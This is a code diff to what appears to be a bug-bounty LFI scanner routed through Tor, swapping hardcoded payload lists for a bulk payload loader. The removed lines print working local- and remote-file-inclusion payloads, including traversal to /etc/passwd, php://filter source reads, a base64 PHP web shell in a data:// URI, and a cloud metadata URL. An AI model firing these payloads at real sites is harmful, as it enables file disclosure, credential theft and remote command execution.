@@ -9,6 +9,7 @@ import re
 import logging
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from modules.utils import tor_session
+from modules.bugbounty.payload_loader import load_payloads
 
 logger = logging.getLogger(__name__)
 
@@ -18,34 +19,11 @@ LFI_PARAMS = [
     'pdf', 'read', 'content', 'lang', 'language', 'module',
 ]
 
-LFI_PAYLOADS = [
-    '../../etc/passwd',
-    '../../../etc/passwd',
-    '../../../../etc/passwd',
-    '../../../../../etc/passwd',
-    '../../../../../../etc/passwd',
-    '/etc/passwd',
-    '..%2F..%2Fetc%2Fpasswd',
-    '..%2F..%2F..%2Fetc%2Fpasswd',
-    '..%252F..%252Fetc%252Fpasswd',
-    '../../etc/passwd%00',
-    '../../etc/passwd\x00',
-    '..\\..\\windows\\win.ini',
-    '..%5C..%5Cwindows%5Cwin.ini',
-    'php://filter/convert.base64-encode/resource=index.php',
-    'php://filter/read=convert.base64-encode/resource=config.php',
-    'php://input',
-    'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
-    '/var/log/apache2/access.log',
-    '/var/log/nginx/access.log',
-    '/proc/self/environ',
-]
-
-RFI_PAYLOADS = [
-    'http://169.254.169.254/latest/meta-data/',
-    'http://127.0.0.1/',
-    'https://example.com/test.txt',
-]
+# Load from proxy payloads (4778) → SecLists → hardcoded fallback
+# path_traversal has 22662 payloads — merge both for maximum coverage
+_LFI_RAW        = load_payloads('lfi')
+_PATH_RAW       = load_payloads('path_traversal', limit=500)  # top 500 traversal variants
+LFI_PAYLOADS    = list(dict.fromkeys(_LFI_RAW + _PATH_RAW))  # deduplicated, LFI first
 
 LFI_SIGNATURES = [
     (r'root:x:0:0',                    'CRITICAL', 'Linux /etc/passwd leaked'),
@@ -62,18 +40,12 @@ LFI_SIGNATURES = [
 
 class LFIScanner:
 
-    TIMEOUT     = (2, 4)  # (connect, read) — fast fail on unresponsive hosts
+    TIMEOUT     = (2, 4)
     MAX_WORKERS = 30
     MAX_TARGETS = 3
     MAX_PARAMS  = 6
-    # Top payloads only — most likely to trigger real LFI
-    FAST_PAYLOADS = [
-        '../../etc/passwd', '../../../etc/passwd', '/etc/passwd',
-        '..%2F..%2Fetc%2Fpasswd', '../../etc/passwd%00',
-        'php://filter/convert.base64-encode/resource=index.php',
-        '..\\..\\windows\\win.ini', '/proc/self/environ',
-        'http://169.254.169.254/latest/meta-data/',
-    ]
+    # Top payloads for fast scan — full LFI_PAYLOADS list used in deep mode
+    FAST_PAYLOADS = LFI_PAYLOADS[:50] if len(LFI_PAYLOADS) >= 50 else LFI_PAYLOADS
 
     def run(self, domain: str, endpoints: list = None) -> dict:
         result = {
